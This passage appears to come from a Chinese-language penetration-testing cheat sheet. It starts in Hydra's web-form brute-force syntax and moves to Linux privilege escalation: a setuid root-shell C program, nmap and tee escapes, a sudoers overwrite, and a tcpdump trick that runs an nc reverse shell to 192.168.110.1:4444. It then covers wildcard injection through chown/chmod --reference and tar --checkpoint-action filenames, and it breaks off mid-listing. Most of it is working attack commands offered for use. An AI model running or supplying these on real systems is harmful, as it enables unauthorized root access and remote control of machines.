with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
Invalid condition login check can be preceded by "F=", successful condition
login check must be preceded by "S=".
This is where most people get it wrong. You have to check the webapp what a failed string 
looks like and put it in this parameter!
 The following parameters are optional:
 C=/page/uri to define a different page to gather initial cookies from
 (h|H)=My-Hdr\: foo to send a user defined HTTP header with each request
 ^USER^ and ^PASS^ can also be put into these headers!
 Note: 'h' will add the user-defined header at the end
 regardless it's already being sent by Hydra or not.
 'H' will replace the value of that header if it exists, by the
 one supplied by the user, or add the header at the end
 Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
 All colons that are not option separators should be escaped (see the examples above and below).
 You can specify a header without escaping the colons, but that way you will not be able to put colons
 in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
 "/login.php:user=^USER^&amp;pass=^PASS^:incorrect"
 "/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed"
 "/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\:
Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;
flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;
trusted=0:reason=:C=/exchweb"</pre>
<h2>Unprivileged shell to privileged shell</h2>
<ul class="simple">
<li>检查cron.d并看看是否有任何脚本在任何时候以root身份执行，并且是时间单位可写。如果是这样，你可以使用/ bin / bash来设置一个二进制文件，并使用它来获取root。</li>
</ul>
<p>Suid.c</p>
<pre>int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }</pre>
<ul class="simple">
<li>SUDO -l Permissions</li>
<li>nmap suid shell：</li>
</ul>
<pre><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">echo</span> <span class="s1">'require "os".execute "/bin/sh"'</span><span class="p">)</span></pre>
<p>或者</p>
<pre><span class="n">nmap</span> <span class="o">--</span><span class="n">interactive</span></pre>
<ul class="simple">
<li>如果tee是suid：tee用于读取输入的，那么将其写入输出文件。这意味着我们可以使用tee来读取我们自己的命令，并将它们添加到any_script.sh中，然后可以作为root用户运行。如果一些脚本作为root运行，你也可以运行。例如，假设tidy.sh在服务器上以root身份执行，我们可以在temp.sh中编写以下代码</li>
</ul>
<pre>temp.sh
echo “milton ALL=(ALL) ALL” &gt; /etc/sudoers”
</pre>
<p>要么</p>
<pre>chmod +w /etc/sudoers to add write properties to sudoers file to do the above</pre>
<p>接着</p>
<pre>cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</pre>
<p>它会将temp.sh的内容添加到tidyup.sh。</p>
<ul class="simple">
<li>tcpdump：“-z postrotate-command”option（在tcpdump版本4.0.0中引入）。</li>
</ul>
<p>创建temp.sh（其中包含作为root执行的命令）</p>
<pre><span class="nb">id</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">nc</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">110.1</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span></pre>
<p>执行命令</p>
<pre><span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">W</span> <span class="mi">1</span> <span class="o">-</span><span class="n">G</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">./</span><span class="n">temp</span><span class="o">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">Z</span> <span class="n">root</span></pre>
<div>帮助</div>
<pre>-C file_size : Before  writing a raw packet to a savefile, check whether the file is currently 
larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after
 the first savefile will have the name specified with the -w flag, with a number after it, starting 
at 1 and continuing upward.  The units of file_size are millions of 
bytes (1,000,000 bytes, not 1,048,576 bytes).

-W Used  in conjunction with the -C option, this will limit the number of files created to the 
specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  
In addition,it will name the files with enough leading 0s to support the maximum number of files, 
allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number 
of rotated dump files that get created, exiting with status 0 when reaching the limit. If used 
with -C as well, the behavior will result in cyclical files per timeslice.

-z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump
\run " postrotate-command file " where file is the savefile being closed after each rotation. 
For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this
doesn't disturb the capture process.

And in case you would like to use a command that itself takes flags or different arguments, you can always 
write a shell script that will take the savefile name as the only argument, make the flags &amp;  arguments
arrangements and execute the command that you want.

-Z user
--relinquish-privileges=user If tcpdump is running as root, after opening the capture device or 
input savefile, but before opening any savefiles for output, change the user ID to user and the 
group ID to the primary group of user.

This behavior can also be enabled by default at compile time.
</pre>
<blockquote>
<div>注意：学习更多可以去<a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>。</div>
</blockquote>
<div id="unprivileged-shell-to-privileged-shell" class="section">
<p><strong>1.g0tm1lk blog提权</strong></p>
<div>
<ul class="simple">
<li>如何使用“高级Linux文件权限”？Sticky bits，SUID＆GUID</li>
</ul>
<pre>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a
file can delete or rename here.
find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done   
 # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and 
any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more 
detail and hide any errors (e.g. permission denied)</pre>
</div>
<div>
<ul class="simple">
<li>在哪里可以写和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm</li>
</ul>
<pre>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner 
of a file can delete or rename here.
find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who 
started it.
find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who 
started it.

find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null;
done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 
and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail 
and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</pre>
<ul class="simple">
<li>任何“problem”文件？可写入的“nobody”文件</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</pre>
</div>
</div>
</div>
</div>
<p><strong>2.Unix通配符：</strong></p>
<div>
<p>下面的文本可看<a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">这里</a>。</p>
</div>
<div>
<ul class="simple">
<li>Chown文件引用技巧（文件所有者劫持）</li>
</ul>
<div>
<p>第一个真正有趣的目标，我偶然发现是“chown”。我们有一些公开可写的目录，其中有一堆PHP文件，root用户想要将所有PHP文件的所有者更改为“nobody”。请注意以下文件列表中的文件所有者。</p>
<pre>[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
</pre>
<p>此公共目录中的文件主要由名为“user”的用户所有，root用户现在将其更改为“nobody”。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chown -R nobody:nobody \*.php</span></pre>
</div>
</div>
<p>让我们看看谁现在拥有文件&#8230;</p>
<pre>root@defensecode public]# ls -al
  total 52
  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
  drwx------. 22 user user 4096 Oct 28 17:34 ..
  -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
  -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
  -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
  -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
  -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
  -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
  -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
  -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
  -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
  -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
  -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
  -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php


Something is not right... What happened? Somebody got drunk here. Superuser tried to change files owner to 
the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, 
this directory previously contained just the following two files created and owned by the user 'leon'.</pre>
<pre>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</pre>
<p>事实是，在&#8217;chown&#8217;命令行中使用的通配符使用任意的&#8217;-reference = .drf.php&#8217;文件，并作为选项在命令行将其传递给chown命令。</p>
<p>让我们检查chown手册页（man chown）：</p>
<pre><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>
  <span class="n">use</span> <span class="n">RFILE</span><span class="s1">'s owner and group rather than specifying OWNER:GROUP values</span>


<span class="n">So</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">case</span><span class="p">,</span> <span class="s1">'--reference'</span> <span class="n">option</span> <span class="n">to</span> <span class="s1">'chown'</span> <span class="n">will</span> <span class="n">override</span> <span class="s1">'nobody:nobody'</span> <span class="n">specified</span> <span class="k">as</span> <span class="n">the</span> <span class="n">root</span><span class="p">,</span> <span class="ow">and</span> 
<span class="n">new</span> <span class="n">owner</span> <span class="n">of</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">this</span>
             <span class="n">directory</span> <span class="n">will</span> <span class="n">be</span> <span class="n">exactly</span> <span class="n">same</span> <span class="k">as</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">of</span> <span class="s1">'.drf.php'</span><span class="p">,</span> <span class="n">which</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">case</span> <span class="n">user</span> <span class="s1">'leon'</span><span class="o">.
</span> <span class="n">Just</span> <span class="k">for</span> <span class="n">the</span> <span class="n">record</span><span class="p">,</span> <span class="s1">'.drf'</span> <span class="ow">is</span> <span class="n">short</span> <span class="k">for</span> <span class="n">Dummy</span> <span class="n">Reference</span> <span class="n">File</span><span class="o">.</span> <span class="p">:)</span>

             <span class="n">To</span> <span class="n">conclude</span><span class="p">,</span> <span class="n">reference</span> <span class="n">option</span> <span class="n">can</span> <span class="n">be</span> <span class="n">abused</span> <span class="n">to</span> <span class="n">change</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">to</span> <span class="n">some</span> <span class="n">arbitrary</span> <span class="n">user</span><span class="o">.
</span> <span class="n">If</span> <span class="n">we</span> <span class="nb">set</span> <span class="n">some</span> <span class="n">other</span> <span class="n">file</span> <span class="k">as</span> <span class="n">argument</span>                  <span class="n">to</span> <span class="n">the</span> <span class="o">--</span><span class="n">reference</span> <span class="n">option</span><span class="p">,</span> <span class="n">file</span> <span class="n">that</span><span class="s1">'s owned by some
 other user, not '</span><span class="n">leon</span><span class="s1">', in that case he would become owner of all files in this                   
 directory. With this simple chown parameter pollution, we can trick root into changing  ownership of files  
to arbitrary users, and practically "hijack" files that are of interest to us.</span>

             <span class="n">Even</span> <span class="n">more</span><span class="p">,</span> <span class="k">if</span> <span class="n">user</span> <span class="s1">'leon'</span> <span class="n">previously</span> <span class="n">created</span> <span class="n">a</span> <span class="n">symbolic</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">that</span> <span class="n">directory</span> <span class="n">that</span> <span class="n">points</span> <span class="n">to</span> 
<span class="n">let</span><span class="s1">'s say /etc/shadow, ownership of /etc/shadow would also be changed to the user '</span><span class="n">leon</span><span class="s1">'.</span></pre>
</div>
<ul class="simple">
<li><strong>Chmod文件引用技巧</strong></li>
</ul>
<div>
<p>另一个有趣的攻击向量类似于之前描述的&#8217;chown&#8217;攻击是&#8217;chmod&#8217;。Chmod还有-reference选项，可以滥用来指定对使用星号通配符选择的文件的任意权限。Chmod手册页（man chmod）：</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>    <span class="p">:</span>   <span class="n">use</span> <span class="n">RFILE</span><span class="s1">'s mode instead of MODE values</span></pre>
</div>
</div>
<p>示例如下。</p>
<pre>[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
</pre>
<p>超级用户现在将尝试对所有文件设置000模式。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chmod 000 *</span></pre>
</div>
</div>
<p>让我们检查文件的权限&#8230;</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">68</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span></pre>
</div>
</div>
<p>发生了什么？这并不是000模式，所有文件现在设置为777模式，因为通过文件名提供的&#8217;-reference&#8217;选项。再次，用户&#8217;leon&#8217;与777模式拥有的文件.drf.php被用作-reference选项参考文件 ，所有文件将被设置为tomode 777.除了-reference选项，攻击者还可以创建另一个文件，使用“-R”文件名，以递归方式更改所有子目录中文件的文件权限。</p>
</div>
<ul class="simple">
<li><strong>Tar任意命令执行</strong></li>
</ul>
<div>
<p>上一个示例是文件所有权劫持的好例子。现在，让我们去更有趣的东西，如任意命令执行。tar是非常常见的unix程序，用于创建和提取归档。常见的用法是创建档案：</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cvvf archive.tar *</span></pre>
</div>
</div>
<p>那么，“tar”的问题是什么？事实是，tar有很多选项，其中，从任意参数注入的角度来看，有一些非常有趣的选项。让我们检查tar手册页（man tar）：</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">--</span><span class="n">checkpoint</span><span class="p">[</span><span class="o">=</span><span class="n">NUMBER</span><span class="p">]</span>      <span class="p">:</span> <span class="n">display</span> <span class="n">progress</span> <span class="n">messages</span> <span class="n">every</span> <span class="n">NUMBERth</span> <span class="n">record</span> <span class="p">(</span><span class="n">default</span> <span class="mi">10</span><span class="p">)</span>
<span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">ACTION</span> <span class="p">:</span> <span class="n">execute</span> <span class="n">ACTION</span> <span class="n">on</span> <span class="n">each</span> <span class="n">checkpoint</span></pre>
</div>
</div>
<p>有&#8217;-checkpoint-action&#8217;选项，它将指定在达到检查点时将执行的程序。基本上，我们可以任意命令执行。</p>
<p>检查以下目录：</p>
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">34</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span></pre>
